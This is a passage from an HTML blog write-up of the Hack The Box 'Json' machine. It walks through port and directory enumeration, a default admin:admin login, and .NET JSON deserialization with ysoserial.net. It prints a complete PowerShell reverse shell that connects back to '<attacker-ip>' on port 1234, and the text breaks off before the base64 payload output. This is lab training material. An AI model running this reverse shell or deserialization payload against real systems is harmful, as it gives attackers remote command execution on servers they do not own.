<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Be prepared to reinvent yourself!">
    <meta name="author" content="Sabe Barker">

    <title>Json - Hack The Box · Sabe Barker</title>

    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/json/">

    <!-- Bootstrap core CSS -->
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
	<!-- Custom CSS -->
    <link href="/assets/css/sabe.css" rel="stylesheet">
    <!-- Lightbox -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
    <!-- Favicons -->
	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
	<link rel="manifest" href="/assets/img/favicons/manifest.json">
	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
	<link rel="icon" href="/assets/img/favicons/favicon.ico">
	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
	<meta name="application-name" content="Sabe Barker">
	<meta name="msapplication-TileColor" content="#fff">
	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
	<meta name="theme-color" content="#fff">
	
    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@sabebarker">
    <meta name="twitter:creator" content="@sabebarker">
    <meta name="twitter:title" content="Json - Hack The Box · Sabe Barker">
    <meta name="twitter:description" content="Be prepared to reinvent yourself!">
    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/json/json_infocard.png">

    <!-- Facebook -->
    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/json/" />
    <meta property="og:title" content="Json - Hack The Box · Sabe Barker">
    <meta property="og:description" content="Be prepared to reinvent yourself!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/json/json_infocard.png">
    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/json/json_infocard.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
	<script>
  		window.dataLayer = window.dataLayer || [];
  		function gtag(){dataLayer.push(arguments);}
  		gtag('js', new Date());

  		gtag('config', 'UA-151243373-1');
	</script>
  </head>
  <body>
    <a class="skippy sr-only sr-only-focusable" href="#content">
      <span class="skippy-text">Skip to main content</span>
    </a>

    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
      </a>

      <div class="navbar-nav-scroll">
        <ul class="navbar-nav sb-navbar-nav flex-row">
          <li class="nav-item">
            <a class="nav-link " href="/search">
        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
      </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/">
	      Home
	     </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/blog">
	      Blog
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="/writeups">
	      Writeups
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/tools">
	      Tools
	    </a>
          </li>
        </ul>
      </div>

      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
        <li class="nav-item">
          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
       </li>
      </ul>
    </header>


    <div class="container-fluid">
      <div class="row flex-xl-nowrap">
        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>

<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
        Getting Started
      </a>

      <ul class="nav sb-sidenav"><li>
            <a href="/writeups/hackthebox/getting-started/introduction/">
              Introduction
            </a>
          </li><li>
            <a href="/writeups/hackthebox/getting-started/basic-setup/">
              Basic Setup
            </a>
          </li><li>
            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
              VPN Setup
            </a>
          </li></ul>
    </div><div class="sb-toc-item active">
      <a class="sb-toc-link" href="/writeups/hackthebox/machines/openadmin/">
        Machines
      </a>

      <ul class="nav sb-sidenav"><li>
            <a href="/writeups/hackthebox/machines/openadmin/">
              OpenAdmin
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/mango/">
              Mango
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/traverxec/">
              Traverxec
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/forest/">
              Forest
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/postman/">
              Postman
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/scavenger/">
              Scavenger
            </a>
          </li><li class="active sb-sidenav-active">
            <a href="/writeups/hackthebox/machines/json/">
              Json
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/ai/">
              AI
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/bitlab/">
              Bitlab
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/craft/">
              Craft
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/networked/">
              Networked
            </a>
          </li></ul>
    </div></nav>
        </div>

        
          <div class="d-none d-xl-block col-xl-2 sb-toc">
            <ul class="section-nav">
<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
<ul>
<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
<li class="toc-entry toc-h3"><a href="#directory-bruteforce">Directory Bruteforce</a></li>
<li class="toc-entry toc-h3"><a href="#domains">Domains</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#user">User</a></li>
<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
</ul>
          </div>
        

        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
          <h1 class="sb-title" id="content">Json</h1>
          <p class="sb-lead">Be prepared to reinvent yourself!</p>
          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/json/json_infocard.png" alt="HackTheBox Json Machine Info Card" class="img-fluid" /></p>

<p><strong>Json</strong> is a medium difficulty machine running Windows. It tests your knowledge in <em>OSINT, JSON Deserialization and basic Privilege Escalation.</em> I didn’t find anything too overly complicated with this machine. It was obvious as to what needed to be done it was just a matter of finding the right payload and the correct injection point.</p>

<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>

<h2 id="enumeration">Enumeration</h2>

<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>

<h3 id="portscan">Portscan</h3>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan json.htb
Grabbing ports...
Ports grabbed!
Scanning...
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-13 10:05 PST
Nmap scan report <span class="k">for </span>json.htb <span class="o">(</span>10.10.10.158<span class="o">)</span>
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC                                                                                                                                          
49157/tcp open  msrpc        Microsoft Windows RPC                                                                                                                                          
49158/tcp open  msrpc        Microsoft Windows RPC                                                                                                                                          
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows                                                                                                    
                                                                                                                                                                                            
Host script results:                                                                                                                                                                        
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s                                                                                                                               
|_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:98:ae <span class="o">(</span>VMware<span class="o">)</span>                                                                                              
|_smb-os-discovery: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>                                                                                                                        
| smb-security-mode:                                                                                                                                                                        
|   authentication_level: user                                                                                                                                                              
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-01-13T22:06:22
|_  start_date: 2020-01-13T15:49:51</code></pre></figure>

<p>Ports to take note of here are <code class="highlighter-rouge">ftp</code> on port <code class="highlighter-rouge">22</code>, <code class="highlighter-rouge">winrm</code> on port <code class="highlighter-rouge">5985</code> and then there is also <code class="highlighter-rouge">smb</code> on port <code class="highlighter-rouge">445</code>, <code class="highlighter-rouge">netbios</code> on port <code class="highlighter-rouge">139</code> and various <code class="highlighter-rouge">rpc</code> ports.</p>

<p>We see a version number for <code class="highlighter-rouge">IIS</code> but we don’t see one for <code class="highlighter-rouge">FileZilla</code>.</p>

<p>A quick connection with <code class="highlighter-rouge">netcat</code> reveals that information:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc json.htb 21                                                                                                                                                                        
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span class="o">(</span>tim.kosse@filezilla-project.org<span class="o">)</span>
220 Please visit https://filezilla-project.org/</code></pre></figure>

<p>Using the <code class="highlighter-rouge">searchsploit</code> command we see no immediate results pertaining to the versions found.</p>

<h3 id="directory-bruteforce">Directory Bruteforce</h3>

<p>Doing a scan with <em>Gobuster</em> using the <code class="highlighter-rouge">dir</code> mode reveals some files and directories:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://json.htb <span class="nt">-r</span> <span class="nt">-t</span> 30 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> .php,.txt,.html,.asp,.aspx <span class="nt">-o</span> gobuster_dir-main.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://json.htb
<span class="o">[</span>+] Threads:        30
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt,html
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/01/13 21:15:32 Starting gobuster
<span class="o">===============================================================</span>
/css <span class="o">(</span>Status: 403<span class="o">)</span>
/files <span class="o">(</span>Status: 403<span class="o">)</span>
/img <span class="o">(</span>Status: 403<span class="o">)</span>
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/js <span class="o">(</span>Status: 403<span class="o">)</span>
/login.html <span class="o">(</span>Status: 200<span class="o">)</span>
/views <span class="o">(</span>Status: 403<span class="o">)</span>
<span class="o">===============================================================</span>
2020/01/13 21:18:44 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>We see two directories of interest <code class="highlighter-rouge">files</code> and <code class="highlighter-rouge">views</code>. Let’s dig a bit deeper by looking in to <code class="highlighter-rouge">views</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://json.htb/views/ <span class="nt">-r</span> <span class="nt">-t</span> 30 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> .php,.txt,.html,.asp,.aspx <span class="nt">-o</span> gobuster_dir-views.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://json.htb/views/
<span class="o">[</span>+] Threads:        30
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt,html
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/01/13 21:32:59 Starting gobuster
<span class="o">===============================================================</span>
/contacto.html <span class="o">(</span>Status: 200<span class="o">)</span>
/forgot.html <span class="o">(</span>Status: 200<span class="o">)</span>
/login.html <span class="o">(</span>Status: 200<span class="o">)</span>
/principal.html <span class="o">(</span>Status: 200<span class="o">)</span>
/productos.html <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
2020/01/13 21:36:09 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>We find some interesting files but no more directories. Let’s check the <code class="highlighter-rouge">files</code> directory as well:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://json.htb/files/ <span class="nt">-r</span> <span class="nt">-t</span> 30 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> .php,.txt,.html,.asp,.aspx <span class="nt">-o</span> gobuster_dir-files.txt                                                
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://json.htb/files/
<span class="o">[</span>+] Threads:        30
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt,html
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/01/13 22:31:18 Starting gobuster
<span class="o">===============================================================</span>
/password.txt <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
2020/01/13 22:42:01 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>We have a <code class="highlighter-rouge">password.txt</code> file! Taking a look at that file all we see is:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Jajaja 

Not Correct</code></pre></figure>

<h3 id="domains">Domains</h3>

<p>Let’s checkout the main website at <code class="highlighter-rouge">http://json.htb</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/json/json.htb.gif" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/json/json.htb.gif" alt="Json Main Screenshot" class="img-fluid" /></a></p>

<p>Interesting. The slow load shows me a <code class="highlighter-rouge">dashboard</code> and then redirects to the <code class="highlighter-rouge">login.html</code> page. Although this looks like it may be a web app I notice the title of the page as <code class="highlighter-rouge">SB Admin 2</code>. I recognise it immediately as a <em>Bootstrap</em> dashboard theme by <a href="https://startbootstrap.com/themes/sb-admin-2/">StartBootstrap</a>. So this site is custom not a known web app.</p>

<p>Like every <code class="highlighter-rouge">login</code> page we come across we try the credentials <code class="highlighter-rouge">admin:admin</code> which logs us in.</p>

<p>We are presented with the <code class="highlighter-rouge">dashboard</code> that we got a glimpse of:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/json/json.htb_dashboard.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/json/json.htb_dashboard.png" alt="Json Dashboard Screenshot" class="img-fluid" /></a></p>

<p>Analyzing the login with <em>Burp Suite</em> we notice the <em>POST</em> call to <code class="highlighter-rouge">/api/token/</code> with <code class="highlighter-rouge">Accept: application/json</code> and <code class="highlighter-rouge">Content-Type: application/json</code> in the header. There’s our <code class="highlighter-rouge">JSON</code> reference.</p>

<h2 id="user">User</h2>

<p>On doing some research online we come across many articles on <code class="highlighter-rouge">deserialization</code> and specifically what has been coined <a href="https://www.owasp.org/images/d/d7/Marshaller_Deserialization_Attacks.pdf.pdf">Friday the 13th JSON Attacks</a>. In these slides we see a tool that may be of use called <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> where an example is given to create a payload that pings a machine: <code class="highlighter-rouge">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -base64 -c "ping 10.0.0.19"</code>.</p>

<p>Refining our command to fit our needs we end up with the following:</p>

<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">payload.ps1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">.</span><span class="nf">\ysoserial.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">WindowsIdentity</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">Json.Net</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-s</span></code></pre></figure>

<p>The <code class="highlighter-rouge">payload.ps1</code> file contains the code for a standard <em>PowerShell</em> reverse shell:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">cmd /c powershell <span class="nt">-nop</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;attacker-ip&gt;',1234);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span></code></pre></figure>

<p>The result is a <code class="highlighter-rouge">base64</code> encoded output which we will copy to our clipboard:</p>

